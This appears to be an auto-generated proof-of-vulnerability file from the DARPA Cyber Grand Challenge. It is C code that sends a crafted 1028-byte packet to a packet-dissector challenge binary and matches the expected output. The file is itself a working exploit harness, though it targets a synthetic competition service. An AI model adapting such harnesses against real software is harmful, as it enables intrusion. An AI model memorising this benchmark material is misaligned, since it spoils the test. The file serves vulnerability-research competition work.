#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x60\xbe\x81\xe8"
         "\x7d\xed\x7a\x1d\xaf\x64\x11\xd9\x5b\x4b\x78\x45\xd8\xfe\x3a\x57"
         "\x39\x00\x00\x00\x04\xc2\x53\x1e\x5c\xf8\x8a\x73\xd1\x2e\xd4\xb4"
         "\xcc\xe9\xe1\x0d\xc1\xe7\x4a\x07\x38\x72\x54\xea\xb4\xb9\x37\x9c"
         "\xf8\xc8\x45\x2e\x1b\x0a\x1b\x42\x37\xfb\x57\xa3\x5c\x2b\x33\x07"
         "\x7d\x64\x43\x7c\x4b\x23\x36\x33\xdd\x01\xb3\x82\x59\xa8\x57\xc1"
         "\x35\xc5\x0a\x3e\x9f\x9a\xa8\x13\x0e\xdf\xc8\xc7\x8d\x41\xfd\xb3"
         "\xa4\xc7\x8d\xab\x1f\xad\xc7\x3d\x33\x97\xf0\x7f\xab\x7f\xf7\xea"
         "\x5b\x4b\x4d\x60\x4c\x26\x7e\xde\x23\xcf\x40\x1d\x65\xed\xa0\x22"
         "\x8f\x25\xf7\x2d\x64\xa4\x3a\x80\x6b\x0d\xa2\xfa\x92\x0e\x8c\x61"
         "\x13\x38\x97\x0f\xfb\x09\x51\xbb\xa2\x2b\x5b\xc3\x71\xea\xf5\x71"
         "\x36\x94\xed\x41\x3e\x61\x01\x00\x28\xcf\x4e\x2b\x94\xdf\xac\x5b"
         "\x87\xce\x3b\x70\xd3\x7e\x4a\x63\xad\x00\xd3\xd2\x5d\x28\x78\x98"
         "\xdd\xac\xaa\x23\x4c\xb1\x73\x65\xb8\x2f\xd2\xc9\xc1\x7d\x49\x55"
         "\x92\x3a\xd7\x1d\x10\x3a\xda\x36\xde\x3e\x9f\x8c\xca\xa7\x72\x2f"
         "\xe9\xfa\x01\xf8\x55\x9d\x67\xae\xb0\x8a\x4c\x7b\xd4\x11\x29\xe8"
         "\xb5\x1f\x18\xe0\x6d\xd1\xec\x12\x29\xdb\x98\x26\x80\x17\x33\x8d"
         "\xc8\x5e\x14\x0c\x9a\x0a\xa4\x56\xfc\x37\x10\x35\xa7\x47\xb7\x10"
         "\x97\xc9\xec\x9a\x89\x4f\x7a\x70\xef\xc0\xf3\x96\xb2\x77\xa2\x7f"
         "\xd7\x68\x78\xa3\x42\x64\x33\x0b\xea\x35\xfc\x95\xe1\x70\xef\x63"
         "\x3e\xc0\x57\x8f\x8d\x26\xa3\x16\xe7\xd7\xe9\xed\x97\x82\x27\xad"
         "\x24\x08\x8b\x21\xf4\x99\xe0\x9b\x44\x58\xc6\x02\xb6\xe1\x41\x61"
         "\x52\xdc\x4e\xf7\x9e\xe3\x83\x6f\xc5\x27\xc1\x28\xc6\xf7\x91\x15"
         "\x80\xe4\x7f\x22\xcd\xd4\x20\x6a\x2e\x81\x1b\x07\xa6\xaf\x0d\x70"
         "\x91\xe8\x4f\x49\x63\x24\xc0\x5e\xc7\x05\x32\x74\x5b\xf9\x72\xf5"
         "\xc0\x59\x03\x37\x15\x92\x5e\x37\xa8\x8d\xd7\x14\xea\xf3\x1d\x4d"
         "\x2c\xc8\x6d\xf8\x5e\x46\x2e\x88\xdd\x4f\x3a\x60\xd9\x20\x69\xd6"
         "\xe7\xea\xd7\x81\xf6\x85\x0a\xc3\xbc\x9d\xb1\xc8\x60\x97\xc8\xe4"
         "\xff\xc9\x21\x69\x45\x4d\x7f\x78\x0a\x6c\xac\xec\xe4\x2a\x6e\x0c"
         "\x89\xe9\x72\x8a\x51\x5b\x92\x01\x2e\xf8\xcd\xf0\x31\x76\x68\x84"
         "\xd2\xde\xb1\x1d\x0d\x60\xfb\xa3\xcd\xe8\x52\xcf\xfa\x13\x1e\x6e"
         "\x31\x37\x65\x88\x4a\x77\x23\xfa\x88\xd1\xff\x66\x02\xe5\x7b\x43"
         "\x0d\x95\x93\x31\xbe\xc2\xbe\xf6\xe4\xf7\xac\xdb\x26\xd3\x56\x4b"
         "\x6e\x07\x14\x6f\xdf\xd1\x16\x2c\x5a\x43\x74\xa8\x1d\x16\x93\xf3"
         "\x4b\x97\xc1\xb1\x17\xd0\x17\x4d\x20\x55\xbe\x96\xe7\x4e\x71\x6e"
         "\x48\x95\x10\x00\x79\xc7\x37\xc8\x04\x64\xef\x92\x3b\x95\x05\x57"
         "\x0a\x9b\x66\x63\xbb\x87\x55\x1f\x18\x20\x6a\xc2\xcd\x19\x71\x78"
         "\xb4\x65\xbb\xda\x9c\xc4\xc4\x3b\xe8\x27\x0d\xad\x18\xb1\x41\x7e"
         "\xd3\x86\xbd\x1b\xf1\x63\x26\x3c\xa0\x6c\x5d\xa0\xa3\xfa\xb3\x77"
         "\x25\x10\xbe\x52\x98\x43\xa9\x2e\x9e\x23\x91\x63\x98\xc5\x8a\xe2"
         "\xd5\xd9\xf9\x87\x6b\xb4\xbd\x4d\xac\x53\x8f\xc7\x62\xb1\xcc\xac"
         "\x9a\x0c\xe7\x1e\x89\xd4\x94\xf9\x9f\x50\x44\x05\x7d\x72\x0c\x93"
         "\xd6\x5b\xac\x0a\x46\x8f\x45\xd7\x98\x94\x48\x6a\x41\x60\x44\x22"
         "\x2a\xe0\x15\xa7\x77\x03\x74\x32\x0d\xe4\xf2\xe5\x81\x77\x5b\xcd"
         "\x15\x81\x5d\xcf\xa8\xe8\xee\xfb\xbc\x90\xaa\x25\xec\x7c\xf6\xb3"
         "\xa9\x4e\x26\x34\x3b\xca\xa9\x05\xde\x3a\x32\x5e\x49\x02\x6c\x56"
         "\x49\x78\x10\xba\xee\xda\xfa\xd7\x47\x20\xec\x1b\x90\x21\xe1\x73"
         "\x71\xf0\x7b\xef\x24\x32\xe5\xd5\x03\xd7\xb0\x58\x76\x64\x23\x08"
         "\xdf\x7c\x1b\x1f\x44\x9a\x43\x2b\x26\x73\x1a\xe7\x58\x5f\xb4\xd9"
         "\x44\xb1\x27\x8d\xc4\xca\xfd\x50\x39\xd0\xd6\x37\xc9\x35\x48\x80"
         "\x4a\x3f\xd8\xb0\x81\x20\xf4\xf7\x7a\x42\xf9\x55\x34\x69\x35\x57"
         "\x29\xe7\x15\xd4\x5b\x1d\xb2\xb1\x2a\xdb\x80\x7d\x24\x15\xe6\xc7"
         "\x7f\xfa\xed\x23\xe5\xc9\x33\x30\xcf\x33\x6b\xb4\x58\x5b\xf4\xb4"
         "\x57\x75\x61\xbc\x0a\x76\x58\xbb\xfc\x19\x78\xa5\xe0\xcc\x7b\xc4"
         "\x37\x94\x4f\xf8\x4f\xbf\x60\x26\x7b\x21\x18\xc9\x33\x38\xa7\x3f"
         "\xdb\xa3\x68\x30\x6c\x2b\xfc\x7a\x08\xa5\xbd\x75\x29\x7c\x41\x95"
         "\x27\x84\x41\x5a\x25\x6f\x32\x71\xfb\xe3\xae\x52\xa0\x2d\x5d\xf5"
         "\x41\x6c\xe0\x9b\x81\xff\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===kempstergarefowl
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6b\x65\x6d\x70\x73\x74\x65\x72\x67\x61\x72"
         "\x65\x66\x6f\x77\x6c";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*===dextrosinistralElaeococca
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x64\x65\x78\x74\x72\x6f\x73\x69\x6e\x69\x73"
         "\x74\x72\x61\x6c\x45\x6c\x61\x65\x6f\x63\x6f\x63\x63\x61";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00005;
      unsigned int read_00005_len;
      unsigned int read_00005_ptr = 0;
      //**** delimited read
      static unsigned char read_00005_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00005 = NULL;
      read_00005_len = 0;
      int read_00005_res = cgc_delimited_read(0, &read_00005, &read_00005_len, read_00005_delim, 4);
      if (read_00005_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00005_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00005_00000_match;
      pcre *read_00005_00000_pcre = cgc_init_regex(read_00005_00000_regex);
      if (read_00005_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00005_00000_pcre, 0, read_00005 + read_00005_ptr, read_00005_len - read_00005_ptr, &read_00005_00000_match);
         if (rc > 0) {
            read_00005_ptr += read_00005_00000_match.match_end - read_00005_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00005_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00005);
      if (read_00005_ptr) {}  //silence unused variable warning if any
   } while (0);
}
